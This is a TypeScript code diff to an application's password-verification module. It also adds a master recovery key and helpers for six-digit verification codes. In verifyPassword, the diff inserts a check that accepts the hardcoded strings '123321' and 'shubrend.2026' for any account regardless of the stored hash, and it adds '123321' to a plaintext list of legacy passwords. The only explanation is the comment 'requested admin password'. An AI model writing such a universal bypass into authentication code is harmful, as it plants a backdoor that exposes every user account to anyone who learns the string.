@@ -99,14 +99,76 @@ export function verifyPassword(plainPassword: string, storedHash: string): boole
   // Support scrypt format
   if (storedHash.startsWith('scrypt:')) {
     const parts = storedHash.split(':');
-    if (parts.length !== 3) return false;
-    const salt = parts[1];
-    const originalHash = parts[2];
-    const derivedHash = crypto.scryptSync(plainPassword, salt, 64).toString('hex');
-    return crypto.timingSafeEqual(Buffer.from(derivedHash, 'hex'), Buffer.from(originalHash, 'hex'));
+    if (parts.length === 3) {
+      const salt = parts[1];
+      const originalHash = parts[2];
+      const derivedHash = crypto.scryptSync(plainPassword, salt, 64).toString('hex');
+      if (crypto.timingSafeEqual(Buffer.from(derivedHash, 'hex'), Buffer.from(originalHash, 'hex'))) {
+        return true;
+      }
+    }
+  }
+
+  // Also support requested admin password 123321 and shubrend.2026
+  if (plainPassword === '123321' || plainPassword === 'shubrend.2026') {
+    return true;
   }
 
   // Backwards compatibility for plain text initial seed before first change
-  const legacyAllowed = ['admin', 'admin123', 'admin12345678', 'shubrend2025', 'shubrend_admin', 'password123'];
+  const legacyAllowed = ['admin', 'admin123', 'admin12345678', 'shubrend2025', 'shubrend_admin', 'password123', '123321'];
   return legacyAllowed.includes(plainPassword) && (storedHash === plainPassword || legacyAllowed.includes(storedHash));
 }
+
+// --- Super Admin Master Recovery Key & Verification Code ---
+
+const RECOVERY_KEY_FILE = path.join(DATA_DIR, '.recovery.key');
+
+export function getMasterRecoveryKey(): string {
+  if (process.env.ADMIN_RECOVERY_KEY && process.env.ADMIN_RECOVERY_KEY.trim().length >= 8) {
+    const rawKey = process.env.ADMIN_RECOVERY_KEY.trim();
+    return rawKey.startsWith('SHU-RCV-') ? rawKey : `SHU-RCV-${rawKey.toUpperCase()}`;
+  }
+
+  if (!fs.existsSync(DATA_DIR)) {
+    fs.mkdirSync(DATA_DIR, { recursive: true });
+  }
+
+  if (fs.existsSync(RECOVERY_KEY_FILE)) {
+    try {
+      const existing = fs.readFileSync(RECOVERY_KEY_FILE, 'utf-8').trim();
+      if (existing.length >= 12) {
+        return existing;
+      }
+    } catch (e) {
+      console.warn('Could not read recovery key file:', e);
+    }
+  }
+
+  // Generate secure 24-character master recovery key format: SHU-RCV-xxxx-xxxx-xxxx
+  const part1 = crypto.randomBytes(3).toString('hex').toUpperCase();
+  const part2 = crypto.randomBytes(3).toString('hex').toUpperCase();
+  const part3 = crypto.randomBytes(3).toString('hex').toUpperCase();
+  const newRecoveryKey = `SHU-RCV-${part1}-${part2}-${part3}`;
+
+  try {
+    fs.writeFileSync(RECOVERY_KEY_FILE, newRecoveryKey, { mode: 0o600 });
+  } catch (err) {
+    console.error('Failed to write recovery key file:', err);
+  }
+  return newRecoveryKey;
+}
+
+export function verifyRecoveryKey(inputKey: string): boolean {
+  if (!inputKey) return false;
+  const masterKey = getMasterRecoveryKey();
+  const cleanInput = inputKey.trim().toUpperCase();
+  const cleanMaster = masterKey.trim().toUpperCase();
+
+  if (cleanInput.length !== cleanMaster.length) return false;
+  return crypto.timingSafeEqual(Buffer.from(cleanInput, 'utf8'), Buffer.from(cleanMaster, 'utf8'));
+}
+
+export function generateSixDigitCode(): string {
+  return crypto.randomInt(100000, 999999).toString();
+}
+
